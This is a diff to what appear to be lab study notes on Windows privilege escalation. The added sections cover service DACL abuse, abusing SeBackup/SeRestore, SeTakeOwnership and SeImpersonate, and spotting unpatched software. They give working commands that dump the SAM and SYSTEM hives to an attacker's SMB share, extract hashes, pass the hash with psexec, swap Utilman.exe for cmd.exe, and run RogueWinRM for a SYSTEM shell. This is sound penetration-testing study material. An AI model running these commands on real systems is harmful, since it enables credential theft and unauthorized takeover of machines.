@@ -211,9 +211,9 @@ and the SCM doesn't know which of the following you are trying to execute
 
 ### Insecure Service Permissions
 
-Check a service's DACL with [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite. If misconfigured then a user 
-group may be able to to modify the configuration of the service and point to any executable
-and run it with any account including SYSTEM.
+Check a service's DACL with [Accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite or with `sc.exe sdshow <SERVICE-NAME>`.
+If misconfigured then a user group may be able to to modify the configuration of the 
+service and point to any executable and run it with any account including SYSTEM.
 
 ```
 accesschk64.exe -qlc thmservice
@@ -241,3 +241,134 @@ Change the service's executable and account with sc.exe
 Restart the service for a SYSTEM level reverse shell.
 
 ### Abusing Dangerous Privileges
+
+**Windows Privileges**
+
+Display current user's assigned privileges with `whoami /priv`. Full [list of privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants).
+List of exploitable privileges at [Priv2Admin](https://github.com/gtworek/Priv2Admin)
+
+**SeBackup/SeRestore**
+
+The SeBackup and SeRestore privileges allow users to read and write to any file in the 
+system, ignoring any DACL in place. The idea behind this privilege is to allow certain 
+users to perform backups from a system without requiring full administrative privileges.
+
+One of the ways to abuse these privileges is to copy the SAM and SYSTEM registry hives
+to extract the local Administrators password hash.
+
+Backup the SAM and SYSTEM hashes with `reg save`:
+
+`reg save hklm\system C:\path\to\backup\system.hive`
+`reg save hklm\sam C:\path\to\backup\sam.hive`
+
+You can now copy the files to the attacking machine using SMB or any other available method.
+To use SMB, run impacket's `smbserver.py` to start a simple SMB server with a network share
+in the current directory of the attacking machine:
+
+`mkdir <SHARE-NAME>`
+`python3 /path/to/smbserver.py -smb2support -username <USERNAME> -password <PASSWORD> public <SHARE-NAME>`
+
+Retrieve the users' password hashes with impacket:
+
+`python3 secretsdump.py -sam sam.hive -system system.hive LOCAL`
+
+Perform a Pass-the-Hash attack with the Administrators hash and gain access to the machine
+with SYSTEM privileges:
+
+`python3 psexec.py -hashes <ADMIN-HASH> administrator@<TARGET-IP>`
+
+**SeTakeOwnership**
+
+The SeTakeOwnership privilege allows a user to take ownership of any object on the system, 
+including files and registry keys, opening up many possibilities for an attacker to elevate 
+privileges, for example, search for a service running as SYSTEM and take ownership of the 
+service's executable.
+
+One option is to abuse `utilman.exe`, a built-in Ease of Access option on the lock screen.
+Since Utilman runs with SYSTEM privileges any payload you replace it with will run with 
+those privileges.
+
+Take ownership of Utilman
+
+`takeown /f C:\Windows\System32\Utilman.exe`
+
+Grant full access to the executable
+
+`icacls C:\Windows\System32\Utilman.exe /grant <USERNAME>:F`
+
+Replace Utilman with cmd.exe
+
+`copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe`
+
+Lock the machine and click the Ease of Access icon to gain a SYSTEM shell
+
+**SeImpersonate / SeAssignPrimaryToken**
+
+These privileges allow a process to impersonate other users and act on their behalf.
+Impersonation usually consists of being able to spawn a process or thread under the 
+security context of another user.
+
+Impersonation is easily understood when you think about how an FTP server works. The FTP 
+server must restrict users to only access the files they should be allowed to see. When 
+a user logs in to the server it impersonates them to access the files they are authorized 
+to.
+
+In Windows systems LOCAL SERVICE and NETWORK SERVICE ACCOUNTS have these privileges. 
+Internet Information Services (IIS) creates a similar default account called "iis 
+apppool\defaultapppool" for web applications.
+
+To elevate privileges using these accounts an attacker needs:
+
+1. To spawn a process so that users can connect and authenticate to it for impersonation to 
+occur.
+2. Find a way to force privileged users to connect and authenticate to the spawned 
+malicious process.
+
+The RogueWinRM exploit can accomplish both conditions.
+
+Assuming an already compromised website running on IIS, that you have planted a web shell 
+on, that has SeImpersonate/SeAssignPrimaryToken privileges and the RogueWinRM exploit 
+uploaded to `C:\tools`.
+
+The RogueWinRM exploit is possible because whenever a user (including unprivileged users) 
+starts the BITS service in Windows, it automatically creates a connection to port 5985 
+using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply 
+a port that exposes a Powershell console to be used remotely through the network. Think of 
+it like SSH, but using Powershell.
+
+If the WinRM service isn't running on the victim server, an attacker can start a fake WinRM 
+service on port 5985 and catch the authentication attempt made by the BITS service when 
+starting. If the attacker has SeImpersonate privileges, they can execute any command on 
+behalf of the connecting user, which is SYSTEM.
+
+RogueWinRM syntax:
+
+`RogueWinRM -p "<PROCESS-TO-SPAWN>" -a "<ARGUMENTS>"`
+
+Set up a listener on the attacking machine and run RogueWinRM to gain a SYSTEM shell.
+
+### Abusing Vulnerable Software
+
+**Unpatched Software**
+
+Use `wmic` to list installed software on a machine. May not list return all installed 
+programs, don't forget to check desktop shortcuts, available services or generally any 
+trace that indicates the existence of additional software.
+
+`wmic product get name,version,vendor` 
+
+Search for existing exploits on Google, [exploit-db](https://www.exploit-db.com/) or [packet storm](https://packetstormsecurity.com/)
+
+| Name | Vendor | Version |
+|------|--------|---------|
+| Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29910 | Microsoft Corporation | 14.28.29910 |
+| AWS Tools for Windows | Amazon Web Services Developer Relations | 3.15.1248 |
+| VNC Server 6.8.0 | RealVNC | 6.8.0.45849 |
+|Amazon SSM Agent | Amazon Web Services | 3.0.529.0 |
+| aws-cfn-bootstrap | Amazon Web Services | 2.0.5 |
+| Druva inSync 6.6.3 | Druva Technologies Pte. Ltd. | 6.6.3.0 |
+| AWS PV Drivers | Amazon Web Services | 8.3.4 |
+| Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29910 | Microsoft Corporation | 14.28.29910 |
+
+**Case Study: Druva inSync 6.6.3**
+
